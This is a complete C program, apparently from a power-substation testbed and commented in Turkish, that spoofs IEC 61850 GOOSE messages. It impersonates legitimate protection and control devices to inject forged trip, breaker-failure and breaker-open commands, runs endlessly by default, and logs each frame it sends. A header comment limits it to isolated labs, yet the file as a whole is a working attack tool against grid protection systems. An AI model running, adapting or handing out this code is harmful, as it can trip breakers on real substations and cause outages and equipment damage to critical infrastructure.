/* =========================================================================
 *  goose_attacker.c — IEC 61850 GOOSE Spoofing / False Trip Tool
 * =========================================================================
 *  TESTBED / EGITIM AMACLIDIR. Yalnizca izole laboratuvar ortaminda
 *  (process bus VLAN10) kullanilmalidir. Gercek trafo merkezlerinde
 *  kullanimi yasa disidir.
 * -------------------------------------------------------------------------
 *  Saldiri prensibi:
 *    Mesru Protection IED'nin GOOSE yayinini (goCbRef, dataSetRef, AppID,
 *    multicast MAC) birebir taklit ederek Process Bus'a sahte bir TRIP
 *    cercevesi enjekte eder. Breaker IED (BCU) gelen cerceveyi mesru
 *    sanarak devre kesiciyi acar. Gercek bir ariza yoktur.
 *
 *  Modlar:
 *    trip  : IED2_PROT/LLN0$GO$Trip     AppID 0x8001  MAC 01:0c:cd:01:00:01
 *    bfp   : IED2_PROT/LLN0$GO$BFPTrip  AppID 0x8004  MAC 01:0c:cd:01:00:04
 *    ctrl  : IED4_CTRL/LLN0$GO$Cmd      AppID 0x8008  MAC 01:0c:cd:01:00:08
 *
 *  Kullanim:
 *    ./goose_attacker                      # varsayilan: trip, sonsuz
 *    ./goose_attacker -m trip -c 20        # 20 sahte trip cercevesi
 *    ./goose_attacker -m ctrl -i eth0      # yetkisiz kontrol komutu
 *    ./goose_attacker -m all -c 5 -p 100   # tum modlar, 100 ms aralik
 * ========================================================================= */

#ifndef _DEFAULT_SOURCE
#define _DEFAULT_SOURCE 1 /* usleep / gettimeofday icin (strict c99) */
#endif
#ifndef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>

#include "goose_publisher.h"
#include "linked_list.h"
#include "mms_value.h"

/* -------------------------------------------------------------------------
 * HEDEF TANIMLARI — mesru IED'lerden birebir kopyalanmistir
 * ---------------------------------------------------------------------- */
#define APPID_PROT_TRIP      0x8001
#define APPID_BFP_EXT_TRIP   0x8004
#define APPID_CTRL_CMD       0x8008

static const uint8_t MC_TRIP[6] = {0x01, 0x0c, 0xcd, 0x01, 0x00, 0x01};
static const uint8_t MC_BFP[6]  = {0x01, 0x0c, 0xcd, 0x01, 0x00, 0x04};
static const uint8_t MC_CTRL[6] = {0x01, 0x0c, 0xcd, 0x01, 0x00, 0x08};

#define GOCB_TRIP  "IED2_PROT/LLN0$GO$Trip"
#define DS_TRIP    "IED2_PROT/LLN0$TripDataSet"
#define GOCB_BFP   "IED2_PROT/LLN0$GO$BFPTrip"
#define DS_BFP     "IED2_PROT/LLN0$BFPDataSet"
#define GOCB_CTRL  "IED4_CTRL/LLN0$GO$Cmd"
#define DS_CTRL    "IED4_CTRL/LLN0$CmdDataSet"

#define ATTACK_LOG "logs/attack_log.csv"

/* -------------------------------------------------------------------------
 * GLOBAL DURUM
 * ---------------------------------------------------------------------- */
static volatile int running = 1;
static unsigned long frame_count = 0;
static unsigned long stNum = 1000; /* mesru IED'nin stNum'unun ilerisinden basla */

static void handle_sigint(int sig) {
  (void)sig;
  running = 0;
}

static void get_ts(char *buf, size_t len) {
  struct timeval tv;
  gettimeofday(&tv, NULL);
  struct tm *t = localtime(&tv.tv_sec);
  char base[32];
  strftime(base, sizeof(base), "%Y-%m-%dT%H:%M:%S", t);
  snprintf(buf, len, "%s.%03ld", base, tv.tv_usec / 1000);
}

/* -------------------------------------------------------------------------
 * SALDIRI KAYDI — makale/rapor icin CSV
 * ---------------------------------------------------------------------- */
static void log_attack(const char *mode, uint16_t appId, uint32_t st,
                       uint32_t sq, int ok) {
  FILE *f = fopen(ATTACK_LOG, "a");
  if (!f)
    return; /* log dizini yoksa sessizce devam et */
  char ts[64];
  get_ts(ts, sizeof(ts));
  fprintf(f, "%s,%s,0x%04X,%u,%u,%lu,%s\n", ts, mode, appId, st, sq, frame_count,
          ok ? "SENT" : "FAIL");
  fclose(f);
}

/* -------------------------------------------------------------------------
 * PUBLISHER OLUSTUR — mesru IED'nin kimligiyle
 * ---------------------------------------------------------------------- */
static GoosePublisher make_spoof_publisher(const char *iface, uint16_t appId,
                                           const uint8_t *mac,
                                           const char *gocbRef,
                                           const char *dsRef) {
  CommParameters p;
  memset(&p, 0, sizeof(p));
  p.appId = appId;
  p.vlanId = 0;
  p.vlanPriority = 4; /* mesru IED ile ayni oncelik */
  memcpy(p.dstAddress, mac, 6);

  GoosePublisher pub = GoosePublisher_create(&p, iface);
  if (!pub) {
    fprintf(stderr, "[HATA] Publisher olusturulamadi (iface: %s, AppID: 0x%04X)\n",
            iface, appId);
    return NULL;
  }

  GoosePublisher_setGoCbRef(pub, (char *)gocbRef);
  GoosePublisher_setDataSetRef(pub, (char *)dsRef);
  GoosePublisher_setConfRev(pub, 1);
  GoosePublisher_setStNum(pub, stNum);
  /* Nadiren de olsa gonderim varsayilanlari degistirilebilir:
     GoosePublisher_setTimeAllowedToLive(pub, 2000); */
  return pub;
}

/* -------------------------------------------------------------------------
 * SAHTE TRIP — IED2_PROT/LLN0$GO$Trip  (AppID 0x8001)
 * DataSet: [trip_F1, trip_F2, bfpActive] — mesru yapiyla ayni
 * ---------------------------------------------------------------------- */
static void attack_trip(const char *iface, int count, int period_ms) {
  GoosePublisher pub = make_spoof_publisher(iface, APPID_PROT_TRIP, MC_TRIP,
                                            GOCB_TRIP, DS_TRIP);
  if (!pub)
    return;

  printf("[SALDIRI] Sahte TRIP cercevesi yayinlanacak (AppID:0x%04X, MAC:01:0c:cd:01:00:01)\n",
         APPID_PROT_TRIP);

  for (int i = 0; (count == 0 || i < count) && running; i++) {
    LinkedList ds = LinkedList_create();
    LinkedList_add(ds, MmsValue_newBoolean(1)); /* trip_F1 = TRUE  <- KRITIK */
    LinkedList_add(ds, MmsValue_newBoolean(0)); /* trip_F2 = FALSE */
    LinkedList_add(ds, MmsValue_newBoolean(0)); /* bfpActive = FALSE */

    GoosePublisher_setStNum(pub, stNum++);
    int rc = GoosePublisher_publish(pub, ds);
    LinkedList_destroyDeep(ds, (LinkedListValueDeleteFunction)MmsValue_delete);

    frame_count++;
    log_attack("trip", APPID_PROT_TRIP, (uint32_t)(stNum - 1), 0, rc >= 0);

    char ts[64];
    get_ts(ts, sizeof(ts));
    printf("[%s] [SALDIRI] #%lu TRIP enjekte edildi  stNum=%lu  %s\n", ts,
           frame_count, stNum - 1, rc >= 0 ? "OK" : "BASARISIZ");

    if (period_ms > 0)
      usleep((useconds_t)period_ms * 1000);
  }

  GoosePublisher_destroy(pub);
}

/* -------------------------------------------------------------------------
 * SAHTE BFP — IED2_PROT/LLN0$GO$BFPTrip  (AppID 0x8004)
 * Komsu baylari da acmaya zorlar (genisletilmis trip).
 * ---------------------------------------------------------------------- */
static void attack_bfp(const char *iface, int count, int period_ms) {
  GoosePublisher pub =
      make_spoof_publisher(iface, APPID_BFP_EXT_TRIP, MC_BFP, GOCB_BFP, DS_BFP);
  if (!pub)
    return;

  printf("[SALDIRI] Sahte BFP genisletilmis TRIP (AppID:0x%04X)\n",
         APPID_BFP_EXT_TRIP);

  for (int i = 0; (count == 0 || i < count) && running; i++) {
    LinkedList ds = LinkedList_create();
    LinkedList_add(ds, MmsValue_newBoolean(1));

    GoosePublisher_setStNum(pub, stNum++);
    int rc = GoosePublisher_publish(pub, ds);
    LinkedList_destroyDeep(ds, (LinkedListValueDeleteFunction)MmsValue_delete);

    frame_count++;
    log_attack("bfp", APPID_BFP_EXT_TRIP, (uint32_t)(stNum - 1), 0, rc >= 0);

    char ts[64];
    get_ts(ts, sizeof(ts));
    printf("[%s] [SALDIRI] #%lu BFP enjekte edildi  stNum=%lu\n", ts, frame_count,
           stNum - 1);

    if (period_ms > 0)
      usleep((useconds_t)period_ms * 1000);
  }

  GoosePublisher_destroy(pub);
}

/* -------------------------------------------------------------------------
 * YETKISIZ KONTROL KOMUTU — IED4_CTRL/LLN0$GO$Cmd  (AppID 0x8008)
 * deger=0 => BCU devre kesiciyi ACAR  (mesru Control IED yerine gecme)
 * ---------------------------------------------------------------------- */
static void attack_ctrl(const char *iface, int count, int value, int period_ms) {
  GoosePublisher pub =
      make_spoof_publisher(iface, APPID_CTRL_CMD, MC_CTRL, GOCB_CTRL, DS_CTRL);
  if (!pub)
    return;

  printf("[SALDIRI] Yetkisiz kontrol komutu (AppID:0x%04X, deger:%d => %s)\n",
         APPID_CTRL_CMD, value, value ? "KAPAT" : "AC");

  for (int i = 0; (count == 0 || i < count) && running; i++) {
    LinkedList ds = LinkedList_create();
    LinkedList_add(ds, MmsValue_newBoolean(value));

    GoosePublisher_setStNum(pub, stNum++);
    int rc = GoosePublisher_publish(pub, ds);
    LinkedList_destroyDeep(ds, (LinkedListValueDeleteFunction)MmsValue_delete);

    frame_count++;
    log_attack("ctrl", APPID_CTRL_CMD, (uint32_t)(stNum - 1), 0, rc >= 0);

    char ts[64];
    get_ts(ts, sizeof(ts));
    printf("[%s] [SALDIRI] #%lu kontrol komutu enjekte edildi  stNum=%lu\n", ts,
           frame_count, stNum - 1);

    if (period_ms > 0)
      usleep((useconds_t)period_ms * 1000);
  }

  GoosePublisher_destroy(pub);
}

/* -------------------------------------------------------------------------
 * KULLANIM
 * ---------------------------------------------------------------------- */
static void usage(const char *prog) {
  printf("Kullanim: %s [secenekler]\n\n", prog);
  printf("  -i <iface>   Process Bus arayuzu (varsayilan: eth0)\n");
  printf("  -m <mod>     trip | bfp | ctrl | all   (varsayilan: trip)\n");
  printf("  -c <adet>    Gonderilecek cerceve sayisi, 0 = sonsuz (varsayilan: 0)\n");
  printf("  -p <ms>      Cerceveler arasi bekleme, ms (varsayilan: 50)\n");
  printf("  -v <0|1>     ctrl modunda deger: 0=AC, 1=KAPAT (varsayilan: 0)\n");
  printf("  -h           Bu yardimi goster\n\n");
  printf("Ornek: %s -m trip -c 10 -p 20\n", prog);
}

/* -------------------------------------------------------------------------
 * MAIN
 * ---------------------------------------------------------------------- */
int main(int argc, char **argv) {
  const char *iface = "eth0";
  const char *mode = "trip";
  int count = 0;
  int period_ms = 50;
  int ctrl_value = 0;

  int opt;
  while ((opt = getopt(argc, argv, "i:m:c:p:v:h")) != -1) {
    switch (opt) {
    case 'i': iface = optarg; break;
    case 'm': mode = optarg; break;
    case 'c': count = atoi(optarg); break;
    case 'p': period_ms = atoi(optarg); break;
    case 'v': ctrl_value = atoi(optarg); break;
    case 'h': usage(argv[0]); return 0;
    default: usage(argv[0]); return 1;
    }
  }

  signal(SIGINT, handle_sigint);
  signal(SIGTERM, handle_sigint);

  printf("========================================================\n");
  printf(" GOOSE SPOOFING ARACI — yalnizca izole testbed ortami\n");
  printf("========================================================\n");
  printf(" Arayuz : %s\n", iface);
  printf(" Mod    : %s\n", mode);
  printf(" Adet   : %s\n", count == 0 ? "sinirsiz" : "sinirli");
  printf(" Aralik : %d ms\n", period_ms);
  printf(" Log    : %s\n", ATTACK_LOG);
  printf("--------------------------------------------------------\n");

  if (strcmp(mode, "trip") == 0) {
    attack_trip(iface, count, period_ms);
  } else if (strcmp(mode, "bfp") == 0) {
    attack_bfp(iface, count, period_ms);
  } else if (strcmp(mode, "ctrl") == 0) {
    attack_ctrl(iface, count, ctrl_value, period_ms);
  } else if (strcmp(mode, "all") == 0) {
    attack_bfp(iface, count, period_ms);
    if (running) attack_trip(iface, count, period_ms);
    if (running) attack_ctrl(iface, count, ctrl_value, period_ms);
  } else {
    fprintf(stderr, "[HATA] Bilinmeyen mod: %s\n", mode);
    usage(argv[0]);
    return 1;
  }

  printf("--------------------------------------------------------\n");
  printf("[BITTI] Toplam %lu sahte GOOSE cercevesi gonderildi.\n", frame_count);
  return 0;
}
